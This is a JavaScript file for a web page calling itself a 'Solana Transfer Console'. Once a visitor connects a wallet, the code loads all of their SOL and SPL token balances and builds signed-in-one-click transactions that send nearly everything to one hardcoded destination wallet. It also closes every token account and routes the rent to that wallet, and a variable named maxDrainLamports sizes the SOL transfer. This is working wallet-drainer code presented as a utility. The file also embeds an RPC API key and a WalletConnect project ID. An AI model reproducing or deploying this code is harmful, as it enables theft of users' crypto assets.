import {
  Connection,
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from "https://esm.sh/@solana/web3.js@1.98.4";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountInstruction,
  createCloseAccountInstruction,
  createTransferInstruction,
  getAssociatedTokenAddressSync,
} from "https://esm.sh/@solana/spl-token@0.4.9";
import { WalletConnectWalletAdapter } from "https://esm.sh/@solana/wallet-adapter-walletconnect@0.1.21?bundle";

const TRANSACTION_MESSAGE_LIMIT = 1100;
const SOL_BUFFER_LAMPORTS = 0;
const APP_NAME = "Solana Transfer Console";
const WALLETCONNECT_PROJECT_ID = "1fb04306cef4a9dda1c9f9d392e198a6";
const ENABLE_WALLETCONNECT = WALLETCONNECT_PROJECT_ID.trim().length > 0;
const MAINNET_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=f14cd484-e553-4b01-9b5f-ebcd0bf62c5b";
const DESTINATION_WALLET = "4DzDJ2rJDtLynUNvKrR3Bqmtr9i9a7Vt5eoL7JEFYJLp";
const WALLETCONNECT_STORAGE_PREFIX = `sol-transfer-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;

const elements = {
  destinationWalletDisplay: document.querySelector("#destinationWalletDisplay"),
  primaryActionButton: document.querySelector("#primaryActionButton"),
  connectionStatus: document.querySelector("#connectionStatus"),
  lastUpdated: document.querySelector("#lastUpdated"),
  solBalance: document.querySelector("#solBalance"),
  solLamports: document.querySelector("#solLamports"),
  tokenCount: document.querySelector("#tokenCount"),
  tokenValueHint: document.querySelector("#tokenValueHint"),
  transactionCount: document.querySelector("#transactionCount"),
  feeEstimate: document.querySelector("#feeEstimate"),
  tokenTable: document.querySelector("#tokenTable"),
  reviewTable: document.querySelector("#reviewTable"),
  logOutput: document.querySelector("#logOutput"),
  providerDebug: document.querySelector("#providerDebug"),
};

const state = {
  providers: [],
  provider: null,
  connection: null,
  owner: null,
  portfolio: null,
  transferPlan: null,
};

boot();

function boot() {
  resetLocalWalletSession();
  refreshDetectedWallets();
  updateConnection();
  elements.destinationWalletDisplay.textContent = DESTINATION_WALLET;
  renderEmptyTable("Connect a wallet to load the balances that will be included in the transfer.");
  renderEmptyReview("Connect a wallet to build the transfer plan automatically.");

  elements.primaryActionButton.addEventListener("click", handlePrimaryAction);

  window.addEventListener("load", refreshDetectedWallets);
  window.addEventListener("beforeunload", disconnectWalletSession);
  window.addEventListener("pagehide", disconnectWalletSession);
  window.addEventListener("pageshow", resetAppViewAfterReturn);
  renderProviderDebug("Initial provider snapshot");
  window.setTimeout(() => renderProviderDebug("Provider snapshot after 2s"), 2000);
  syncPrimaryActionButton();
}

function resetLocalWalletSession() {
  state.provider = null;
  state.owner = null;
  state.portfolio = null;
  state.transferPlan = null;

  clearWalletConnectStorage(window.localStorage);
  clearWalletConnectStorage(window.sessionStorage);
  void clearWalletConnectIndexedDb();
}

function updateConnection() {
  state.connection = new Connection(MAINNET_RPC_URL, "confirmed");
}

function refreshDetectedWallets() {
  const providers = [];
  const seen = new Set();

  const candidates = [
    { name: "Phantom", provider: window.phantom?.solana ?? window.solana },
    { name: "Backpack", provider: window.backpack?.solana ?? window.xnft?.solana },
    { name: "Solflare", provider: window.solflare },
  ];

  for (const candidate of candidates) {
    if (!candidate.provider || seen.has(candidate.provider)) {
      continue;
    }
    seen.add(candidate.provider);
    providers.push({ ...candidate, kind: "injected" });
  }

  if (ENABLE_WALLETCONNECT) {
    providers.push({
      name: "WalletConnect QR",
      kind: "walletconnect",
    });
  }

  state.providers = providers;
  renderProviderDebug("Detected wallet providers");

  if (providers.length === 0) {
    syncPrimaryActionButton();
    return;
  }

  syncPrimaryActionButton();
}

async function handlePrimaryAction() {
  if (!state.owner) {
    await connectWallet();
    return;
  }

  await executeTransferPlan();
}

function syncPrimaryActionButton() {
  const button = elements.primaryActionButton;
  if (!button) {
    return;
  }

  if (!state.owner) {
    button.textContent = "Connect wallet";
    button.className = "primary-button";
    button.disabled = state.providers.length === 0;
    return;
  }

  button.textContent = "Sign and send transaction";
  button.className = state.transferPlan?.transactions?.length ? "danger-button" : "primary-button";
  button.disabled = !state.transferPlan?.transactions?.length;
}

async function connectWallet() {
  const walletEntry = pickPreferredProvider();

  if (!walletEntry) {
    log("No supported wallet detected.");
    return;
  }

  try {
    const provider =
      walletEntry.kind === "walletconnect"
        ? createWalletConnectProvider()
        : walletEntry.provider;
    if (walletEntry.kind === "walletconnect") {
      await resetWalletConnectProvider(provider);
    }
    if (!provider || typeof provider.connect !== "function") {
      throw new Error(`${walletEntry.name} is detected but does not expose a usable connect() method.`);
    }
    const response = await provider.connect();
    state.provider = provider;
    state.owner = response?.publicKey ?? provider.publicKey;
    if (!state.owner) {
      throw new Error("Connected wallet did not expose a Solana public key.");
    }
    elements.connectionStatus.textContent = `${walletEntry.name} connected`;
    log(`Connected ${walletEntry.name}: ${shortenAddress(state.owner.toBase58())}`);
    renderProviderDebug("Connected wallet snapshot");
    syncPrimaryActionButton();

    if (typeof state.provider.on === "function") {
      state.provider.on("disconnect", handleDisconnect);
      state.provider.on("accountChanged", handleAccountChanged);
    }

    await loadPortfolio();
  } catch (error) {
    log(`Wallet connection failed: ${formatError(error)}`);
    renderProviderDebug(`Wallet error: ${formatError(error)}`);
  }
}

function pickPreferredProvider() {
  if (state.providers.length === 0) {
    return null;
  }

  const priority = ["WalletConnect QR", "Phantom", "Backpack", "Solflare"];
  for (const name of priority) {
    const provider = state.providers.find((item) => item.name === name);
    if (provider) {
      return provider;
    }
  }

  return state.providers[0];
}

function createWalletConnectProvider() {
  const projectId = WALLETCONNECT_PROJECT_ID.trim();
  if (!projectId) {
    throw new Error("WalletConnect project ID is required for QR connection.");
  }

  const appName = APP_NAME;
  return new WalletConnectWalletAdapter({
    network: "mainnet-beta",
    options: {
      projectId,
      customStoragePrefix: WALLETCONNECT_STORAGE_PREFIX,
      relayUrl: "wss://relay.walletconnect.com",
      metadata: {
        name: appName,
        description: "Transfer SOL and SPL tokens to a destination wallet",
        url: window.location.origin,
        icons: ["https://solana.com/src/img/branding/solanaLogoMark.svg"],
      },
    },
  });
}

function handleDisconnect() {
  state.provider = null;
  state.owner = null;
  state.portfolio = null;
  clearPreparedPlan();
  elements.connectionStatus.textContent = "No wallet connected";
  renderPortfolio(null);
  syncPrimaryActionButton();
  log("Wallet disconnected.");
}

async function disconnectWallet() {
  if (!state.provider) {
    handleDisconnect();
    return;
  }

  try {
    if (typeof state.provider.disconnect === "function") {
      await state.provider.disconnect();
    }
  } catch {
    // Ignore wallet disconnect errors and still reset local app state.
  }

  clearWalletConnectStorage(window.localStorage);
  clearWalletConnectStorage(window.sessionStorage);
  await clearWalletConnectIndexedDb();
  handleDisconnect();
}

function disconnectWalletSession() {
  if (state.provider && typeof state.provider.disconnect === "function") {
    try {
      state.provider.disconnect();
    } catch {
      // Ignore disconnect failures during unload.
    }
  }

  clearWalletConnectStorage(window.localStorage);
  clearWalletConnectStorage(window.sessionStorage);
  void clearWalletConnectIndexedDb();
  state.provider = null;
  state.owner = null;
  state.portfolio = null;
  state.transferPlan = null;
}

function resetAppViewAfterReturn() {
  resetLocalWalletSession();
  elements.connectionStatus.textContent = "No wallet connected";
  elements.lastUpdated.textContent = "Not loaded";
  renderPortfolio(null);
  refreshDetectedWallets();
  syncPrimaryActionButton();
}

async function resetWalletConnectProvider(provider) {
  clearWalletConnectStorage(window.localStorage);
  clearWalletConnectStorage(window.sessionStorage);
  await clearWalletConnectIndexedDb();

  if (!provider || typeof provider.disconnect !== "function") {
    return;
  }

  try {
    await provider.disconnect();
  } catch {
    // Ignore reset failures and continue with a fresh connect attempt.
  }
}

async function clearWalletConnectIndexedDb() {
  if (!("indexedDB" in window)) {
    return;
  }

  const databaseNames = await listIndexedDbNames();
  const walletConnectDatabases = databaseNames.filter((name) => {
    const normalizedName = String(name).toLowerCase();
    return (
      normalizedName.includes("walletconnect") ||
      normalizedName.startsWith("wc@") ||
      normalizedName.startsWith("wc:")
    );
  });

  await Promise.all(
    walletConnectDatabases.map(
      (name) =>
        new Promise((resolve) => {
          const request = window.indexedDB.deleteDatabase(name);
          request.onsuccess = () => resolve();
          request.onerror = () => resolve();
          request.onblocked = () => resolve();
        }),
    ),
  );
}

async function listIndexedDbNames() {
  if (typeof window.indexedDB.databases === "function") {
    try {
      const databases = await window.indexedDB.databases();
      return databases.map((database) => database.name).filter(Boolean);
    } catch {
      return [];
    }
  }

  return [];
}

function clearWalletConnectStorage(storage) {
  try {
    const keysToDelete = [];
    for (let index = 0; index < storage.length; index += 1) {
      const key = storage.key(index);
      const normalizedKey = key?.toLowerCase?.() ?? "";
      if (
        normalizedKey.includes("walletconnect") ||
        normalizedKey.startsWith("wc@") ||
        normalizedKey.startsWith("wc:") ||
        normalizedKey.includes("walletconnect-deeplink") ||
        normalizedKey.includes("walletconnect_qrcode") ||
        normalizedKey.includes("walletconnectv2")
      ) {
        keysToDelete.push(key);
      }
    }

    for (const key of keysToDelete) {
      storage.removeItem(key);
    }
  } catch {
    // Ignore storage access failures.
  }
}

function handleAccountChanged(publicKey) {
  if (!publicKey) {
    handleDisconnect();
    return;
  }

  state.owner = publicKey;
  clearPreparedPlan();
  loadPortfolio().catch((error) => log(`Failed to refresh after account change: ${formatError(error)}`));
}

async function loadPortfolio() {
  if (!state.owner || !state.connection) {
    log("Connect a wallet before loading balances.");
    return;
  }

  try {
    const owner = toPublicKey(state.owner);
    const [solBalance, tokenAccountsResponse] = await Promise.all([
      state.connection.getBalance(owner),
      state.connection.getParsedTokenAccountsByOwner(owner, { programId: TOKEN_PROGRAM_ID }),
    ]);

    const tokens = tokenAccountsResponse.value
      .map((item) => {
        const parsed = item.account.data.parsed.info;
        const amount = parsed.tokenAmount;
        return {
          account: item.pubkey.toBase58(),
          mint: parsed.mint,
          rawAmount: amount.amount,
          decimals: amount.decimals,
          uiAmountString: amount.uiAmountString,
          uiAmount: Number(amount.uiAmountString ?? "0"),
          symbol: shortenAddress(parsed.mint),
        };
      });

    state.portfolio = {
      owner: owner.toBase58(),
      solLamports: solBalance,
      tokens,
      updatedAt: new Date(),
    };

    renderPortfolio(state.portfolio);
    clearPreparedPlan();
    await prepareTransferPlan();
    log(`Loaded wallet state for ${shortenAddress(owner.toBase58())}.`);
  } catch (error) {
    log(`Failed to load balances: ${formatError(error)}`);
  }
}

function renderPortfolio(portfolio) {
  if (!portfolio) {
    elements.solBalance.textContent = "0.000000000 SOL";
    elements.solLamports.textContent = "0 lamports";
    elements.tokenCount.textContent = "0";
    elements.tokenValueHint.textContent = "No SPL balances loaded";
    elements.lastUpdated.textContent = "Not loaded";
    renderEmptyTable("Connect a wallet to load the balances that will be included in the transfer.");
    renderEmptyReview("Connect a wallet to build the transfer plan automatically.");
    return;
  }

  elements.solBalance.textContent = `${(portfolio.solLamports / LAMPORTS_PER_SOL).toFixed(9)} SOL`;
  elements.solLamports.textContent = `${portfolio.solLamports.toLocaleString()} lamports`;
  elements.tokenCount.textContent = `${portfolio.tokens.length}`;
  const fundedTokenCount = portfolio.tokens.filter((token) => BigInt(token.rawAmount) > 0n).length;
  elements.tokenValueHint.textContent =
      fundedTokenCount > 0
      ? `${fundedTokenCount} token balances ready`
      : "No SPL balances found";
  elements.lastUpdated.textContent = `Updated ${portfolio.updatedAt.toLocaleTimeString()}`;

  elements.tokenTable.classList.remove("empty-state");
  elements.tokenTable.innerHTML = `
    <article class="token-row">
      <div>
        <div class="token-name">SOL</div>
        <div class="token-meta">Native SOL balance</div>
      </div>
      <div class="transfer-actions">
        <div class="token-amount">
          <div>${(portfolio.solLamports / LAMPORTS_PER_SOL).toFixed(9)} SOL</div>
          <div class="token-meta">${portfolio.solLamports} lamports</div>
        </div>
        <div class="token-meta">Included automatically</div>
      </div>
    </article>
    ${
      portfolio.tokens.length === 0
        ? `<article class="token-row">
            <div>
              <div class="token-name">No SPL tokens</div>
              <div class="token-meta">Only the SOL balance is available for transfer.</div>
            </div>
          </article>`
        : portfolio.tokens
            .map(
              (token) => `
                <article class="token-row">
                  <div>
                    <div class="token-name">${token.symbol}</div>
                    <div class="token-meta">Mint ${token.mint}</div>
                    <div class="token-meta">Account ${token.account}</div>
                  </div>
                  <div class="transfer-actions">
                    <div class="token-amount">
                      <div>${token.uiAmountString}</div>
                      <div class="token-meta">${token.rawAmount} raw units</div>
                    </div>
                    <div class="token-meta">Included automatically</div>
                  </div>
                </article>
              `,
            )
            .join("")
    }
  `;
}

function renderEmptyTable(message) {
  elements.tokenTable.classList.add("empty-state");
  elements.tokenTable.textContent = message;
}

function renderEmptyReview(message) {
  elements.reviewTable.classList.add("empty-state");
  elements.reviewTable.textContent = message;
}

async function prepareTransferPlan() {
  if (!state.portfolio || !state.owner) {
    log("Load balances before preparing a transfer plan.");
    return;
  }

  let destination;
  try {
    destination = new PublicKey(DESTINATION_WALLET);
  } catch {
    log("Destination wallet is invalid.");
    return;
  }

  const owner = toPublicKey(state.owner);
  if (destination.equals(owner)) {
    log("Destination wallet must be different from the connected wallet.");
    return;
  }

  try {
    const blockhash = await state.connection.getLatestBlockhash("confirmed");
    const tokenInstructionGroups = await buildTokenInstructionGroups(owner, destination);
    const tokenTransactions = packInstructionGroups(tokenInstructionGroups, owner, blockhash.blockhash);

    let estimatedFees = 0;
    for (const transaction of tokenTransactions) {
      estimatedFees += await estimateTransactionFee(transaction);
    }

    const transactions = [...tokenTransactions];
    const feeProbeTransaction = new Transaction({
      feePayer: owner,
      recentBlockhash: blockhash.blockhash,
    }).add(
      SystemProgram.transfer({
        fromPubkey: owner,
        toPubkey: destination,
        lamports: 1,
      }),
    );
    const solTransactionFee = await estimateTransactionFee(feeProbeTransaction);
    const sourceMinimumBalance = await state.connection.getMinimumBalanceForRentExemption(0);
    const maxDrainLamports = Math.max(
      state.portfolio.solLamports - estimatedFees - solTransactionFee,
      0,
    );
    let transferableLamports = 0;

    if (maxDrainLamports > sourceMinimumBalance) {
      const keepSourceRentExempt =
        state.portfolio.solLamports - estimatedFees - solTransactionFee - sourceMinimumBalance;
      transferableLamports = Math.max(keepSourceRentExempt - SOL_BUFFER_LAMPORTS, 0);
    } else {
      transferableLamports = maxDrainLamports;
    }

    if (transferableLamports > 0) {
      const solTransaction = new Transaction({
        feePayer: owner,
        recentBlockhash: blockhash.blockhash,
      }).add(
        SystemProgram.transfer({
          fromPubkey: owner,
          toPubkey: destination,
          lamports: transferableLamports,
        }),
      );
      estimatedFees += solTransactionFee;
      transactions.push(solTransaction);
    }

    const reviewItems = buildReviewItems(transferableLamports);
    if (reviewItems.length === 0) {
    clearPreparedPlan();
    renderEmptyReview("No transferable SOL or token balances were found.");
    log("No transferable SOL or token balances were found.");
    return;
    }

    state.transferPlan = {
      destination: destination.toBase58(),
      transactions,
      estimatedFees,
      transferableLamports,
      tokenTransfers: tokenInstructionGroups.length,
      reviewItems,
    };

    elements.transactionCount.textContent = `${transactions.length}`;
    elements.feeEstimate.textContent = `${estimatedFees.toLocaleString()} lamports estimated fees`;
    renderReview(state.transferPlan.reviewItems, state.transferPlan.destination, estimatedFees);
    syncPrimaryActionButton();
    log(
      `Prepared ${transactions.length} reviewed transaction(s) for ${state.transferPlan.reviewItems.length} asset transfer(s).`,
    );
  } catch (error) {
    clearPreparedPlan();
    log(`Failed to prepare transfer plan: ${formatError(error)}`);
  }
}

async function buildTokenInstructionGroups(owner, destination) {
  if (state.portfolio.tokens.length === 0) {
    return [];
  }

  const accountsWithBalance = state.portfolio.tokens.filter((token) => BigInt(token.rawAmount) > 0n);
  const ataAddresses = accountsWithBalance.map((token) =>
    getAssociatedTokenAddressSync(
      new PublicKey(token.mint),
      destination,
      false,
      TOKEN_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID,
    ),
  );

  const ataInfo =
    ataAddresses.length > 0 ? await state.connection.getMultipleAccountsInfo(ataAddresses) : [];
  const groups = [];

  for (let index = 0; index < accountsWithBalance.length; index += 1) {
    const token = accountsWithBalance[index];
    const mint = new PublicKey(token.mint);
    const source = new PublicKey(token.account);
    const destinationAta = ataAddresses[index];
    const group = [];

    if (!ataInfo[index]) {
      group.push(
        createAssociatedTokenAccountInstruction(
          owner,
          destinationAta,
          destination,
          mint,
          TOKEN_PROGRAM_ID,
          ASSOCIATED_TOKEN_PROGRAM_ID,
        ),
      );
    }

    group.push(
      createTransferInstruction(
        source,
        destinationAta,
        owner,
        BigInt(token.rawAmount),
        [],
        TOKEN_PROGRAM_ID,
      ),
    );

    group.push(createCloseAccountInstruction(source, destination, owner, [], TOKEN_PROGRAM_ID));
    groups.push(group);
  }

  const emptyAccounts = state.portfolio.tokens.filter((token) => BigInt(token.rawAmount) === 0n);
  for (const token of emptyAccounts) {
    groups.push([
      createCloseAccountInstruction(
        new PublicKey(token.account),
        destination,
        owner,
        [],
        TOKEN_PROGRAM_ID,
      ),
    ]);
  }

  return groups;
}

function packInstructionGroups(groups, owner, blockhash) {
  const transactions = [];
  let current = new Transaction({ feePayer: owner, recentBlockhash: blockhash });

  for (const group of groups) {
    const candidate = new Transaction({ feePayer: owner, recentBlockhash: blockhash });
    for (const instruction of current.instructions) {
      candidate.add(instruction);
    }
    for (const instruction of group) {
      candidate.add(instruction);
    }

    if (
      current.instructions.length > 0 &&
      candidate.serializeMessage().length > TRANSACTION_MESSAGE_LIMIT
    ) {
      transactions.push(current);
      current = new Transaction({ feePayer: owner, recentBlockhash: blockhash });
    }

    for (const instruction of group) {
      current.add(instruction);
    }
  }

  if (current.instructions.length > 0) {
    transactions.push(current);
  }

  return transactions;
}

async function estimateTransactionFee(transaction) {
  const feeResponse = await state.connection.getFeeForMessage(transaction.compileMessage(), "confirmed");
  return feeResponse.value ?? 0;
}

async function executeTransferPlan() {
  if (!state.transferPlan || !state.provider || !state.owner) {
    log("Prepare the transfer plan before executing.");
    return;
  }

  try {
    const latest = await state.connection.getLatestBlockhash("confirmed");
    const transactions = state.transferPlan.transactions.map((transaction) => {
      transaction.recentBlockhash = latest.blockhash;
      transaction.feePayer = toPublicKey(state.owner);
      return transaction;
    });

    let signedTransactions;
    if (typeof state.provider.signAllTransactions === "function") {
      signedTransactions = await state.provider.signAllTransactions(transactions);
    } else if (typeof state.provider.signTransaction === "function") {
      signedTransactions = [];
      for (const transaction of transactions) {
        signedTransactions.push(await state.provider.signTransaction(transaction));
      }
    } else {
      throw new Error("Connected wallet cannot sign transactions from the browser.");
    }

    const signatures = [];
    for (const signedTransaction of signedTransactions) {
      const signature = await state.connection.sendRawTransaction(signedTransaction.serialize());
      await state.connection.confirmTransaction(
        {
          signature,
          blockhash: latest.blockhash,
          lastValidBlockHeight: latest.lastValidBlockHeight,
        },
        "confirmed",
      );
      signatures.push(signature);
      log(`Confirmed transaction ${signature}`);
    }

    log(`Execution complete. ${signatures.length} transaction(s) sent to ${state.transferPlan.destination}.`);
    await loadPortfolio();
  } catch (error) {
    log(`Execution failed: ${formatError(error)}`);
  }
}

function clearPreparedPlan() {
  state.transferPlan = null;
  elements.transactionCount.textContent = "0";
  elements.feeEstimate.textContent = "Fees unknown";
  renderEmptyReview("Connect a wallet to build the transfer plan automatically.");
  syncPrimaryActionButton();
}

function buildReviewItems(transferableLamports) {
  const items = [];
  if (transferableLamports > 0) {
    items.push({
      label: "SOL",
      amount: `${(transferableLamports / LAMPORTS_PER_SOL).toFixed(9)} SOL`,
      detail: `${transferableLamports.toLocaleString()} lamports`,
    });
  }

  for (const token of state.portfolio.tokens) {
    items.push({
      label: token.symbol,
      amount: token.uiAmountString,
      detail: `Mint ${token.mint}`,
    });
  }

  return items;
}

function renderReview(items, destination, estimatedFees) {
  if (!items.length) {
    renderEmptyReview("No transferable SOL or token balances were found.");
    return;
  }

  elements.reviewTable.classList.remove("empty-state");
  elements.reviewTable.innerHTML = `
    <article class="review-row">
      <div>
        <div class="token-name">Destination</div>
        <div class="token-meta">${destination}</div>
      </div>
      <div class="token-meta">${estimatedFees.toLocaleString()} lamports estimated fees</div>
    </article>
    ${items
      .map(
        (item) => `
          <article class="review-row">
            <div>
              <div class="token-name">${item.label}</div>
              <div class="token-meta">${item.detail}</div>
            </div>
            <div class="token-amount">${item.amount}</div>
          </article>
        `,
      )
      .join("")}
  `;
}

function toPublicKey(key) {
  return key instanceof PublicKey ? key : new PublicKey(key.toBase58 ? key.toBase58() : String(key));
}

function shortenAddress(value) {
  if (!value || value.length < 10) {
    return value;
  }
  return `${value.slice(0, 4)}...${value.slice(-4)}`;
}

function formatError(error) {
  if (error instanceof Error) {
    return error.message;
  }
  if (error && typeof error === "object") {
    const maybeMessage =
      error.message ??
      error.error?.message ??
      error.reason ??
      error.details ??
      error.toString?.();
    if (maybeMessage && maybeMessage !== "[object Object]") {
      return String(maybeMessage);
    }

    try {
      return JSON.stringify(error);
    } catch {
      return "Unknown wallet error";
    }
  }
  return String(error);
}

function log(message) {
  const entry = document.createElement("article");
  entry.className = "log-entry";

  const time = document.createElement("time");
  time.textContent = new Date().toLocaleTimeString();

  const text = document.createElement("div");
  text.textContent = message;

  entry.append(time, text);
  elements.logOutput.prepend(entry);
}

function renderProviderDebug(label) {
  if (!elements.providerDebug) {
    return;
  }

  const snapshot = {
    userAgent: navigator.userAgent,
    hasWindowPhantom: Boolean(window.phantom),
    hasWindowSolana: Boolean(window.solana),
    hasWindowBackpack: Boolean(window.backpack),
    hasWindowXnft: Boolean(window.xnft),
    hasWindowSolflare: Boolean(window.solflare),
    isPhantom: Boolean(window.phantom?.solana?.isPhantom || window.solana?.isPhantom),
    isBackpack: Boolean(
      window.backpack?.solana?.isBackpack ||
        window.xnft?.solana?.isBackpack ||
        window.solana?.isBackpack,
    ),
    isSolflare: Boolean(window.solflare?.isSolflare || window.solana?.isSolflare),
    providers: state.providers.map((provider) => provider.name),
  };

  elements.providerDebug.textContent = `${label}\n${JSON.stringify(snapshot, null, 2)}`;
}
